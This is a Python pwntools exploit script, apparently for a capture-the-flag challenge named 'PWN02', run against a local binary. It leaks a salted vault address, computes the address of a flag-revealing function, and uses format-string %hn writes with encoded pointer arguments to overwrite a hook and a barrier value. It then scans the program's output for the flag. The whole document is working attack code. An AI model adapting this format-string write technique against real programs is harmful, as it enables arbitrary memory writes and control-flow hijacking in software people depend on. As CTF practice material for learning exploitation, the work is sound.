#!/usr/bin/env python3
"""
PWN02 Exploit - Working version for fixed challenge
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

io = process('./challenge')

def do_workshop(io, prefix, fmt):
    io.sendline(b'1')
    io.recvuntil(b'(<=240 bytes)\n')
    io.send(prefix + fmt)
    return io.recvuntil(b'> ')

def rot64(x, r):
    r &= 63
    return ((x >> r) | (x << (64 - r))) & 0xFFFFFFFFFFFFFFFF

def inv_rot64(x, r):
    r &= 63
    return rot64(x, -r)

log.info('='*60)
log.info('PWN02 - Exploit')
log.info('='*60)

# Step 1: Setup vault diary
log.info('Step 1: Setting up vault diary')
io.sendline(b'2')
io.recvuntil(b'note:')
io.sendline(b'pwned')
io.recvuntil(b'> ')

# Step 2: Leak vault address and session_salt
log.info('Step 2: Leaking vault address')
io.sendline(b'3')
output = io.recvuntil(b'> ').decode()

lines = output.split('\n')
digest_line = [l for l in lines if 'session digest' in l][0]
salt_line = [l for l in lines if 'salt checksum' in l][0]
barrier_line = [l for l in lines if 'barrier shadow' in l][0]

digest = int(digest_line.split(':')[1].strip(), 16)
salt_hint = int(salt_line.split(':')[1].strip(), 16)
barrier_hint = int(barrier_line.split(':')[1].strip(), 16)

# Recover session_salt and vault address
session_salt = salt_hint ^ 0xA5A5F0F0C3C3B4B4
vault = digest ^ session_salt

log.success(f'session_salt: {hex(session_salt)}')
log.success(f'vault: {hex(vault)}')

# Step 3: Calculate addresses
hook = vault + 0x48
barrier = vault + 0x40
# Vault seems to be allocated at a consistent offset from binary base
# Based on runtime observation: vault is at base + 0x5040
base_address = vault - 0x5040
reveal_flag_offset = 0x1bc0  # Changes with each rebuild, verify with: objdump -d challenge | grep -B5 "call.*<getenv@plt>"
reveal_flag = base_address + reveal_flag_offset

log.success(f'reveal_flag: {hex(reveal_flag)}')

# Calculate barrier_target
mix = reveal_flag ^ 0x9e3779b97f4a7c15
mix ^= session_salt
barrier_target = rot64(mix, 17) ^ 0x2152411021524110
log.success(f'barrier_target: {hex(barrier_target)}')

# Encoding function (now uses session_salt, not barrier!)
def encode_arg(val, salt, marker, rot_idx):
    rot = ((salt >> (rot_idx * 13)) & 0x3f)
    encoded = inv_rot64((val + marker) & 0xFFFFFFFFFFFFFFFF, rot) ^ salt
    return encoded & 0xFFFFFFFFFFFFFFFF

markers = [0x42424242424, 0xCAFEBEEF1337, 0x102030405060, 0x5555AAAABBBB]

# Step 4: Write reveal_flag to hook
log.info('Step 4: Writing reveal_flag to hook')

halves_rf = [reveal_flag & 0xFFFF, (reveal_flag >> 16) & 0xFFFF,
             (reveal_flag >> 32) & 0xFFFF, (reveal_flag >> 48) & 0xFFFF]

writes = []
prev = 0
for h in halves_rf:
    if h >= prev:
        writes.append(h - prev)
    else:
        writes.append((0x10000 + h) - prev)
    prev = h

fmt_parts = []
for i, w in enumerate(writes):
    if w > 0:
        fmt_parts.append(f'%{w}c'.encode())
    fmt_parts.append(f'%{11+i}$hn'.encode())

fmt_str = b''.join(fmt_parts)

encoded_args = []
for i in range(4):
    addr = hook + (i * 2)
    enc = encode_arg(addr, session_salt, markers[i], i)
    encoded_args.append(enc)

prefix = struct.pack('<4Q', *encoded_args)

out = do_workshop(io, prefix, fmt_str)
log.success('Wrote reveal_flag to hook')

# Step 5: Write barrier_target to barrier
log.info('Step 5: Writing barrier_target to barrier')

halves_bt = [barrier_target & 0xFFFF, (barrier_target >> 16) & 0xFFFF,
             (barrier_target >> 32) & 0xFFFF, (barrier_target >> 48) & 0xFFFF]

writes2 = []
prev = 0
for h in halves_bt:
    if h >= prev:
        writes2.append(h - prev)
    else:
        writes2.append((0x10000 + h) - prev)
    prev = h

fmt_parts2 = []
for i, w in enumerate(writes2):
    if w > 0:
        fmt_parts2.append(f'%{w}c'.encode())
    fmt_parts2.append(f'%{11+i}$hn'.encode())

fmt_str2 = b''.join(fmt_parts2)

encoded_args2 = []
for i in range(4):
    addr = barrier + (i * 2)
    enc = encode_arg(addr, session_salt, markers[i], i)
    encoded_args2.append(enc)

prefix2 = struct.pack('<4Q', *encoded_args2)

out = do_workshop(io, prefix2, fmt_str2)
log.success('Wrote barrier_target to barrier')

# Check for flag
if b'FLAG' in out or b'CTF' in out:
    log.success('='*60)
    log.success('FLAG CAPTURED!')
    log.success('='*60)
    import re
    flag_match = re.search(b'FLAG: (.*?)[\n\r]', out)
    if flag_match:
        log.success(f'Flag: {flag_match.group(1).decode()}')
    else:
        log.info(out.decode(errors='ignore'))
elif b'anomaly' in out:
    log.success('Anomaly detected!')
    log.info(out.decode(errors='ignore'))
else:
    log.warning('Flag not found')
    log.info(out[:500].decode(errors='ignore'))

io.close()